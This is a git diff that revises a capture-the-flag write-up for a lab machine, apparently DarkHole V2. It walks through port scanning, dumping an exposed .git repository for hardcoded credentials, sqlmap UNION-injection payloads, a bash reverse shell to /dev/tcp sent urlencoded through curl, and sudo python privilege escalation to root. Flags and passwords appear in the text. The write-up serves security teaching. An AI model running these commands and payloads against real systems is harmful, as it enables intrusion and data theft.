@@ -1,10 +1,19 @@
-# CTF 04
+## CTF 04
 > Capture The Flag.
- The flag is stored in the user.txt file.
-* IP: 192.168.10.17.
+> 
+> IP: 192.168.10.17
+> 
+> The flag is stored in the flag.txt file.
 
-First thing to do is to scan the IP
-## nmap
+> Capture The Flag.
+> 
+> IP: 192.168.10.17
+> 
+> The flag is stored in the root.txt file.
+
+
+### Nmap
+First thing to do is to scan for open ports.
 
 ```bash 
 $ nmap -sV -Pn -p- -A $IP
@@ -35,68 +44,34 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 332.80 seconds
 ```
-## gobuster
-```bash 
 
-$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt                                           
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://192.168.10.17
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Timeout:                 10s
-===============================================================
-2022/06/15 10:49:30 Starting gobuster in directory enumeration mode
-===============================================================
-/.hta                 (Status: 403) [Size: 278]
-/.git/HEAD            (Status: 200) [Size: 23] 
-/.htpasswd            (Status: 403) [Size: 278]
-/.htaccess            (Status: 403) [Size: 278]
-/config               (Status: 301) [Size: 315] [--> http://192.168.10.17/config/]
-/index.php            (Status: 200) [Size: 740]                                   
-/js                   (Status: 301) [Size: 311] [--> http://192.168.10.17/js/]    
-/server-status        (Status: 403) [Size: 278]                                   
-/style                (Status: 301) [Size: 314] [--> http://192.168.10.17/style/] 
-                                                                                  
-===============================================================
-2022/06/15 10:49:33 Finished
-===============================================================
-```
-So we have this relevant information: 
-1. The port `80` is open and listening 
-2. The `.git` is reacheable
+The scan shows that there are two running services, SSH and a webserver, which has its git repository exposed.
 
-So if we search the ip in the broswer we can see this is the main page
+After opening the website in a browser, a link to the login page is shown.
 
-![Index page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_095914094.png)
+![Index page DarkHoleV2](ctf4/imagen_2022-06-17_095914094.png)
 
-In this page there is any information relevant or important for us, so we look now in the login.php
+![Login page DarkHoleV2](ctf4/imagen_2022-06-17_100010931.png)
 
-![Login page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_100010931.png)
+Here we can see there is a login page, but since we do not have any credential yet, we cannot do anything here.
 
-Here we can see there is a login page, but we don´t have any credential yet, so we can´t do nothing here.
-Lets move to the last thing we can see here the directory `.git`
+### .git
+On the exposed git directory we can see the last commit in `.git/COMMIT_EDITMSG`, which reads:
 
-![.git page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_100133653.png)
+> i changed login.php file for more secure
 
-We can see  in the git history  in the directory `logs` and in the file `COMMIT_EDITMSG` we can read .
->i changed login.php file for more secure
+![.git page DarkHoleV2](ctf4/imagen_2022-06-17_100133653.png){width=65%}
 
-So now that we know there is a vulnerability we want to see the content of the commmits done. There is a usefull tool call git-dumper to see the content of the commits.
+To further investigate the source code, the repository is downloaded using [git-dump](https://github.com/arthaud/git-dumper).
 
-So we install it first.
+
+Now that we have stored the content of the web in the our local directory `./website` we are running the command `git diff` with the last commit id to see the changes to the `login.php`.
+
 ```bash
 $ pip install git-dumper
 
-$ git-dumper http://192.168.10.17 ~/website
-```
-Now that we have stored the content of the web in the our directory `~/website` we are runing the command `git diff` and the commit id for seeing the the login.php that were before.
-```bash
+$ git-dumper http://192.168.10.17 ./website
+
 $ git diff a4d900a8d85e8938d3601f3cef113ee293028e10
 
 diff --git a/login.php b/login.php
@@ -110,21 +85,21 @@ index 8a0ff67..0904b19 100644
 -    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
 +    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
 +    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));
-+    $check = $connect->query("select * from users where email='$email' and password='$pass' and id=1");
++    $check = $connect->query("select * from users where email='$email' and password='$pass'
+    and id=1");
 +    if($check->num_rows){
          $_SESSION['userid'] = 1;
          header("location:dashboard.php");
          die();
 ```
-We use this id because it has as commit message .
->   I added login.php file with default credentials
  
- So now that we have the credentials `lush@admin.com` and `321` as user and password.
+So now that we have the credentials `lush@admin.com:321` as user and password we can use them to login as the admin. It shows a profile page of our user.
 
- Now we login in and there it is the profil page of our user.
-![user page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_104736996.png)
+![User page DarkHoleV2](ctf4/imagen_2022-06-17_104736996.png)
 
-Using burpsuite, we can see that the mobile is not encode or parsec so we tried to inject commands and code, but it didn´t work then we noticed that the cookie was there and we used it to do a `sqlmap` saving the burpsuite output in a file called `sql`.  
+### SQL Inject
+Using burpsuite we save a request which contains an authenticated cookie, to be used by `sqlmap`. With that we try to SQL inject all possible parameters.
+
 ```bash
 $ sqlmap -r request.txt --dbs --batch       
         ___
@@ -134,7 +109,10 @@ $ sqlmap -r request.txt --dbs --batch
 |___|_  [']_|_|_|__,|  _|                                                                                          
       |_|V...       |_|   https://sqlmap.org                                                                       
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent
+    is illegal. It is the end user's responsibility to obey all applicable local, state
+    and federal laws. Developers assume no liability and are not responsible for any misuse
+    or damage caused by this program
 
 [*] starting @ 12:40:59 /2022-06-15/
 
@@ -150,7 +128,9 @@ Parameter: id (GET)
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 6 columns
-    Payload: id=-2051' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717871,0x7a5751754e596265786e54434d724b50496467705467475a656f41726a694e7a7a45724d6a674661,0x716a6b7a71),NULL,NULL,NULL-- -
+    Payload: id=-2051' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717871,
+        0x7a5751754e596265786e54434d724b50496467705467475a656f41726a694e7a7a45724d6a674661,
+        0x716a6b7a71),NULL,NULL,NULL-- -
 ---
 [12:40:59] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
@@ -164,20 +144,12 @@ available databases [5]:
 [*] performance_schema
 [*] sys
 
-[12:40:59] [INFO] fetched data logged to text files under '/home/pascal/.local/share/sqlmap/output/192.168.10.17'
+[12:40:59] [INFO] fetched data logged to text files under
+    '/home/pascal/.local/share/sqlmap/output/192.168.10.17'
 
 [*] ending @ 12:40:59 /2022-06-15/
 
 $ sqlmap -r request.txt -D darkhole_2 --dump-all --batch 
-        ___
-       __H__
- ___ ___[']_____ ___ ___  {1.6.4#stable}                                                                           
-|_ -| . ["]     | .'| . |                                                                                          
-|___|_  [.]_|_|_|__,|  _|                                                                                          
-      |_|V...       |_|   https://sqlmap.org                                                                       
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
 [*] starting @ 12:41:31 /2022-06-15/
 
 [12:41:31] [INFO] parsing HTTP request from 'request.txt'
@@ -192,7 +164,9 @@ Parameter: id (GET)
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 6 columns
-    Payload: id=-2051' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717871,0x7a5751754e596265786e54434d724b50496467705467475a656f41726a694e7a7a45724d6a674661,0x716a6b7a71),NULL,NULL,NULL-- -
+    Payload: id=-2051' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717871,
+        0x7a5751754e596265786e54434d724b50496467705467475a656f41726a694e7a7a45724d6a674661,
+        0x716a6b7a71),NULL,NULL,NULL-- -
 ---
 [12:41:31] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
@@ -210,7 +184,8 @@ Table: users
 | 1  | lush@admin.com |  Street, Pincode, Province/State, Country | 321      | Ayuda por favor | 33             |
 +----+----------------+-------------------------------------------+----------+-----------------+----------------+
 
-[12:41:31] [INFO] table 'darkhole_2.users' dumped to CSV file '/home/pascal/.local/share/sqlmap/output/192.168.10.17/dump/darkhole_2/users.csv'                                                                                       
+[12:41:31] [INFO] table 'darkhole_2.users' dumped to CSV file
+    '/home/pascal/.local/share/sqlmap/output/192.168.10.17/dump/darkhole_2/users.csv'                                                                                       
 [12:41:31] [INFO] fetching columns for table 'ssh' in database 'darkhole_2'
 [12:41:31] [INFO] fetching entries for table 'ssh' in database 'darkhole_2'
 Database: darkhole_2
@@ -222,52 +197,28 @@ Table: ssh
 | 1  | fool | jehad  |
 +----+------+--------+
 
-[12:41:31] [INFO] table 'darkhole_2.ssh' dumped to CSV file '/home/pascal/.local/share/sqlmap/output/192.168.10.17/dump/darkhole_2/ssh.csv'                                                                                           
-[12:41:31] [INFO] fetched data logged to text files under '/home/pascal/.local/share/sqlmap/output/192.168.10.17'
+[12:41:31] [INFO] table 'darkhole_2.ssh' dumped to CSV file
+'/home/pascal/.local/share/sqlmap/output/192.168.10.17/dump/darkhole_2/ssh.csv'                                                                                           
+[12:41:31] [INFO] fetched data logged to text files under
+'/home/pascal/.local/share/sqlmap/output/192.168.10.17'
 
 [*] ending @ 12:41:31 /2022-06-15/
 ```
-The ssh auth is `jehad:fool` now that we have this information we are going to connect throw ssh to the machine.
+`sqlmap` successfully injected the `id` parameter and retrieved the ssh table, containing authentication data for the user `jehad:fool`.
+With that information, we can connect to the SSH server.
 
-## ssh
-```bash
-$ ssh jehad@192.168.10.17 -L 9999:localhost:9999
-jehad@192.168.10.17s password: 
-Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
+Once we are connected we can find the user flag in the directory of `losy`.
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Fri 17 Jun 2022 10:30:59 AM UTC
-
-  System load:  0.0                Processes:              239
-  Usage of /:   50.7% of 12.73GB   Users logged in:        1
-  Memory usage: 20%                IPv4 address for ens33: 192.168.10.17
-  Swap usage:   0%
-
- * Super-optimized for small spaces - read how we shrank the memory
-   footprint of MicroK8s to make it the smallest full K8s around.
-
-   https://ubuntu.com/blog/microk8s-memory-optimisation
-
-0 updates can be applied immediately.
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-Last login: Fri Jun 17 10:29:46 2022 from 192.168.9.4
-```
-Once we are connected we can finde the user.txt in the directory of `losy`. 
 ```bash 
 jehad@darkhole:/home$ cat losy/user.txt 
 cyberctfd{ejkedSmQx5zEBJz9PjE8gTbPkHr839EY}
 ```
-There it's our flag.
 
-## LinPEAS
-running linpeas, it shows a cron to start phpserver on `localhost:9999` in `/opt/web/index.php`. `* * * * * losy cd /opt/web && php -S localhost:9999`
+### Escalate privileges
+Running linpeas, it shows a cron to start a php server on `localhost:9999` in `/opt/web/index.php`.
+`* * * * * losy cd /opt/web && php -S localhost:9999`
+
+The php script executes commands that it received,
 ```bash 
 jehad@darkhole:~$ cat /opt/web/index.php 
 <?php
@@ -277,19 +228,22 @@ echo system($_GET['cmd']);
 }
 ?>
 ```
-This is a console for php.
 
-Now we need a reverse shell doing the next command 
-```bash 
-$ nc -lvp 1337 
-```
-We send this command encoded so the the machine open us a terminal 
+On the attacker machine a reverse shell using `nc -lvp 1337` and portforwarding using SSH with `ssh jehad@192.168.10.17 -L 9999:localhost:9999` is started.
+
+We send this payload urlencoded to activate the reverse shell:
 ```bash
-$ bash -c 'bash -i >& /dev/tcp/192.168.9.4/1337 0>&1
+bash -c 'bash -i >& /dev/tcp/192.168.9.4/1337 0>&1
 ```
-`192.168.10.17:9999/index.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.9.4%2F1337%200%3E%261%27`
 
-Now that we have the reserve shell as losy, lets have a look to the `.bash_history`
+```bash
+$ curl 192.168.10.17:9999/index.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev
+    %2Ftcp%2F192.168.9.4%2F1337%200%3E%261%27`
+```
+
+### Escalate privileges, again
+Now that we have a shell as losy, we take a look in the `.bash_history`.
+
 ```bash
 $ ls -lah ~/.bash_history
 ...
@@ -301,7 +255,8 @@ sudo /usr/bint/python3 -c 'import os; os.system("/bin/sh")'
 sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
 ...
 ```
-So now we know that losy cant execute python as root, now we connect via `$ ssh losy@192.168.10.17` we have the password `gang`
+
+From that we can conclude, that losy can execute python as root and has the password `gang`. We can use that to connect via ssh, to use sudo. The python shell is executed to gain root rights and extract the flag.
 
 ```bash 
 losy@darkhole:~$ sudo -l
@@ -319,4 +274,3 @@ uid=0(root) gid=0(root) groups=0(root)
 # cat /root/root.txt
 cyberctfd{tuF9WIjTCUGyKe8JVKGmqSaDuHp4mQqc}
 ```
-There it is our valious flag!
